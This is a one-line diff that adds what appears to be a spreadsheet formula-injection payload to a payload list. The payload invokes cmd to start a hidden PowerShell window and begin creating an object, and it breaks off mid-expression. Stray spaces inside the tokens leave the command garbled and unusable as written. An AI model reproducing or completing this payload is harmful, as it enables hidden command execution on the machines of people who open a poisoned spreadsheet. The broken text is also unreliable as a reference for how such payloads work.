@@ -1,0 +1,1 @@
+39 = cmd | '/ c powershell . exe -w hidden $e =( New - Object
